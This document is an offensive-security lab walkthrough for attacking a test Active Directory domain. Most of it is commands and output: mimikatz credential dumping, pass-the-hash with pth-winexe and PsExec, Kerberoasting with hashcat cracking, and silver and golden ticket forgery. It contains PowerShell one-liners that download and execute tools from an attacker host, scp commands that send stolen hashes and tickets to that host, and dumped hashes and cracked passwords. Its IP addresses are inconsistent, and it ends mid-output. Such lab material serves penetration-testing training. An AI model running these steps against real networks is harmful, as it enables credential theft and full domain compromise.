# Attacking Active Directory

## Lab Environment

|Server|IP Address|OS|Function|
|---|---|---|---|
|kali.vx|192.168.17.10|Kali Linux 2022.1|Attacking Machine|
|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|

## Nmap Scan

```console
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -Pn 192.168.17.11-13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
```

#### Domain Controller

```console
Nmap scan report for 192.168.17.11
Host is up (0.00090s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-25 04:32:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57911/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57912/tcp open  msrpc         Microsoft Windows RPC
57924/tcp open  msrpc         Microsoft Windows RPC
57929/tcp open  msrpc         Microsoft Windows RPC
57960/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Server, SQL Server

```console
Nmap scan report for 192.168.17.12
Host is up (0.0011s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Workstation

```console
Nmap scan report for 192.168.17.13
Host is up (0.0013s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Time Taken

```console
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
```

# 1. Cached Credential Storage and Retrieval

**On Kali:** Setup web server to host `mimikatz`

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```

**On Target:** Download and run `mimikatz`

- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```

**On Target:** mimikatz commands

- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:

```console
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

## 1.1. Successful `lsadump::sam` example

```console
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
⋮

RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮
```

## 1.2. Successful `lsadump::lsa /patch` example

```console
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

## 1.3. Successful `sekurlsa::logonpasswords` example

```console
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        ⋮

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        ⋮

••• OUTPUT TRUNCATED •••
```

# 2. Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command

## 2.1. pth-winexe
- Domain account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```

- Local account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```

## 2.2. mimikatz - sekurlsa::pth

### 2.2.1. Domain account

- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```

### 2.2.2. Local account

- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window
- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

# 3. Service Account Attack

## 3.1. Discover SPNs

```console
C:\Users\mike>setspn -Q */*
Checking domain DC=lab,DC=vx
CN=krbtgt,CN=Users,DC=lab,DC=vx
        ⋮
CN=SVR,CN=Computers,DC=lab,DC=vx
        ⋮
CN=CLIENT,CN=Computers,DC=lab,DC=vx
        ⋮
CN=DC,OU=Domain Controllers,DC=lab,DC=vx
        ⋮
CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
        MSSQLSvc/SVR.lab.vx:1433
        MSSQLSvc/SVR.lab.vx

Existing SPN found!
```

## 3.2. Kerberoasting

### 3.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package

#### Request tickets from PowerShell

```console
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
```

**Sample Results:**

```console
PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (3)

⋮

#2>     Client: mike @ LAB.VX
        Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/16/2022 10:00:51 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: DC.lab.vx

⋮
```

#### Dump tickets using mimikatz

- ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead

```console
mimikatz # kerberos::list /export

⋮

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi

⋮
```

- ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
- e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors

#### Upload the ticket to Kali

```console
scp <ticket> kali@kali.vx:/home/kali/
```

#### Use the Kerberoast package to extract the hash from the service ticket

#### Install kerberoast module

- Ref: <https://github.com/nidem/kerberoast>

```console
sudo apt -y install kerberoast
```

### 3.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire

#### Dump password hash

**On Kali:** Setup web server to host `Invoke-Kerberoast.ps1`

```console
cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .
sudo python3 -m http.server 80 &> /dev/null &
```

**On Target:** Download and run `Invoke-Kerberoast`

- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Invoke-Kerberoast`

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
```

**On Target:** Upload the hash to Kali

```console
scp tgs.hash kali@kali.vx:/home/kali/
```

## 3.3. Cracking service account hash using hashcat

#### Unpack existing `rockyou.txt` (❗14 million records❗)

```console
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

#### Use the hashcat to crack the service ticket

❗USE HASHCAT, IT'S HELLA FASTER❗

It doesn't matter that `rockyou.txt` has 14 million records, the time taken by hashcat is about the same
- Hashcat takes about **27s** to build a dictionary cache of the wordlist
- If there is a cache hit, cracking the password takes only about **2.7s**

#### Crack the hash

```console
┌──(kali㉿kali)-[~]
└─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1440/2945 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*$a9063376d22e2b32ff90578c2b2cfd8a$81e91299cab444a834e8f09917f5ca8242928fa95629b50e6ec7f165042f684033f9a1fdf5fde0980a7d82bd36dbc4d1f4bd964a0a2b5f389e9cb6e09ac42d012487ba2c084ed1c2f6d1c89356a255e6c76311705ab1410b94eec153c5e869a889f1c8a762a368497851722e722b140ae064f6eeafc8421f83311d0b60772a376f8fc269d4dfb94f7944853e82c0b916faf07d31447e83a4e4d188dd3b977e04cdfdb013b44b806b78836196fb386bbf1aba899f383982d3fc15d423561f7f3b78c046c295ccb858b85510418b7e144b2e3e490f6f83411a7ee437a865dc664df947b1a36255bcf6b0b4876b5be739527af1d3d42df9871e5d3a2542d8bf760c0325721b9ec4fec08edce9991c80d6d6772b9d1b02f2317e993de47be4ff834e06ef42e7796465160680363d654885e032bae19eb7805077bf88f6c2785f27c158fb15cd45dda66fc1a24847cb665d72d40a1f2ebd82d3dddd94ad834340cb32792721758dfae5c5604965010ca182758a1a4b6e609507cac4e41bd1f048fd4fff30365a26ebfb53df7702e9a11d31195e2b2f1fbf677d8e30aaea27551251a1ce4de358787eb79a0fd257cf54388b1acac3b8e02f84592d588278a68b453cf1ff093d14613dcba150d54ef04505d906314e5f61226d1549c7fa48f8193b27fd1367252bfe3ef9309b28ee255c4bb2f0928b10a740125b90d6516cc6a7840b678823a13f709886852f68d1d30adf1b90d2f03718a767eeec31a155f9ccc7bfcfb7e53fac664eeb618fabd645b1e2e981194d34ca577e12f71e531316a07676a40ebc68811e34fce68253736edaf1b7a4368e941ddfc59d8857114534eda478166901339dc6f22488968e0366c7bad729fd419e539107a5915bd477016360f6c2ff6510ba1830ad40c030a4846a315e7e78df2f5898172569f598c2b23e924a4d7d1f6830302082ad302dff6909c72c880caabe497f0cc559a1b9adc16fd5f9144b43bb0c816c83959817624e5f7e743bada7b4161481c9ed6a617f34b06e2deabbd430a7aa332608ac9730f84e425d352a59422080eb2110bce586c1d9cbb6f25a7c0c11dc68a791ce3dfc2660618c3478da3ddc76516d7a471f1a65d23bf9296e41c308d73a121b392b155a648eb0d273a6d4f12fcdc5ffbe895d871e04f4cb51f231d0632f06e004f358fcdbb19ae7a3242090388c28b742337eb87dd2aa7bf70fcab6141740df549917e9d898a85dc4c243811e8fe1d9080e6e3e3be452f053d666e3e1d4fa882c9b4f603a0749efe6fb9cdd5604a6eb9d7656d6d1abe791fad334aa5de88e6bb9123bcd524a2784a37ce73a4c7c03764513453622a968f2e7cfb7eac110883910584c454c6430661f251dd7583472fa1479330628dc633f8b4000e366048efd276e23f973d8cfa83d3f70f390f372c1c0013060b0da119c5e8115a429081e76c9a6866680aa0f76fb8956fd26d3f86f261e387a90fc4c830e54a755b84480f6a8dae6571cbbf1c98880a7a409cf3a4482caa452a87895a43f280bacc497e7df2649bf8c790f4b86a28f76a2e2b10457dcb5920d9217656394ff20a87d90798a3a8743d47d6baff22bfe5b826987d579fef8851098d62b3da90ca3998eff6c82706881af4e0fb0b15867638b4454cf35ef705e53f53f3ba6b5c86c7774b5:P@ssw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:14...7774b5
Time.Started.....: Wed Oct 26 20:52:12 2022 (0 secs)
Time.Estimated...: Wed Oct 26 20:52:12 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   152.8 kH/s (0.64ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 6144/14344385 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: horoscope -> whitetiger

Started: Wed Oct 26 20:51:46 2022
Stopped: Wed Oct 26 20:52:13 2022

real    0m27.158s
user    0m25.597s
sys     0m0.333s
```

## 3.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)

- It is possible to crack the .kirbi ticket exported from mimikatz directing using the `tgsrepcrack.py` script, but it is extremely slow compared to hashcat
- Time taken for `tgsrepcrack.py`:

| Number of passwords | Time taken |
|---|---|
| 10,000 | 0m4.974s |
| 100,000 | 0m47.707s |
| 1,000,000 | 8m14.453s |

- Using the full `rockyou.txt`, which as 14 million records, is near impossible using this method

#### Crack the ticket

```console
┌──(kali㉿kali)-[~]
└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi


    USE HASHCAT, IT'S HELLA FASTER!!


Cracking 1 tickets...
found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
Successfully cracked all tickets

real    0m47.861s
user    0m47.828s
sys     0m0.016s
```

## 3.5. Silver Ticket
### 3.5.1. Retrieve domain's numeric identifier

Security Identifier or SID format: `S-R-I-S`
- `S` - A literal `S` to identify the string as a SID
- `R` - Revision level, usually set to `1`
- `I` - Identifier-authority value, often `5` within AD
- `S` - Subauthority values:
  - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
  - Relative identifier or RID representing the specific object in the domain, e.g. `1105`

```console
C:\Users\mike>whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
```

### 3.5.2. Generate hash value for service account password
```console
mimikatz # kerberos::hash /password:P@ssw0rd
        * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
        * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
        * aes256_hmac       9e0de99003a18068f2e2186cd1162e9b6398f7b873854ccf16040ce16aa06d26
        * des_cbc_md5       76fdfece25e3da54
```

### 3.5.3. Purge existing kerberos tickkets
- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
```console
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```

### 3.5.4. Generate KRB_TGS ticket
- ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`

```console
mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
User      : nonexistentuser
Domain    : LAB.VX (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 1105
Groups Id : *513 512 520 518 519
ServiceKey: e19ccf75ee54e06b06a5907af13cef42 - rc4_hmac_nt
Service   : MSSQLSvc
Target    : svr.lab.vx:1433
Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
```

### 3.5.5. Verify ticket
```console
C:\Users\dummy>klist

Current LogonId is 0:0x3441a5

Cached Tickets: (1)

#0>     Client: nonexistentuser @ LAB.VX
        Server: MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/18/2022 9:15:16 (local)
        End Time:   4/15/2032 9:15:16 (local)
        Renew Time: 4/15/2032 9:15:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

### 3.5.6. Attempt login to service
```console
C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
1> SELECT SYSTEM_USER;
2> GO

--------------------------------------------------------------------------------------------------------------------------------
LAB\nonexistentuser

(1 rows affected)
```

# 4. Golden Ticket

## 4.1. Dump password hashes on domain controller
- Requires `Domain Admins` rights
- Information of interest: domain SID and `krbtgt` password hash

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : LAB / S-1-5-21-1470288461-3401294743-676794760

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 3ac4cccaca955597db0d11a7ffa50025

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 0000044f (1103)
User : bindaccount
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000450 (1104)
User : domainadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000451 (1105)
User : mike
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000452 (1106)
User : cindy
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000453 (1107)
User : john
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000454 (1108)
User : paul
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000455 (1109)
User : mssqlsvcacct
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000456 (1110)
User : mssqlsysadm
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000457 (1111)
User : itmanager
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000458 (1112)
User : itadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000003e8 (1000)
User : DC$
LM   :
NTLM : 8865ea60bb34d0b1b2984e609bebbfb5

RID  : 0000045b (1115)
User : SVR$
LM   :
NTLM : e629246410c5795d27b1f16b221cf083

RID  : 0000045c (1116)
User : CLIENT$
LM   :
NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
```

## 4.2. Create golden ticket using information retrieved from domain controller
- This can be performed on any domain member machine, without administrator rights
- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
- The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session

```console
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:nonexistentuser /domain:lab.vx /sid:S-1-5-21-1470288461-3401294743-676794760 /krbtgt:3ac4cccaca955597db0d11a7ffa50025 /ptt
User      : nonexistentuser
Domain    : lab.vx (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3ac4cccaca955597db0d11a7ffa50025 - rc4_hmac_nt
Lifetime  : 23/4/2022 4:05:49 pm ; 20/4/2032 4:05:49 pm ; 20/4/2032 4:05:49 pm
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ lab.vx' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
```

## 4.3. Use the golden ticket to laterally move to **any** domain machine
- Verify golden ticket in session

```console
C:\Users\john>hostname
CLIENT

C:\Users\john>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.161
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

C:\Users\john>klist

Current LogonId is 0:0x50b951

Cached Tickets: (1)

#0>     Client: nonexistentuser @ lab.vx
        Server: krbtgt/lab.vx @ lab.vx
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/23/2022 15:47:53 (local)
        End Time:   4/20/2032 15:47:53 (local)
        Renew Time: 4/20/2032 15:47:53 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- Attempt to connect to domain member machine

```console
C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\nonexistentuser

C:\Windows\system32>hostname
SVR

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.151
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:

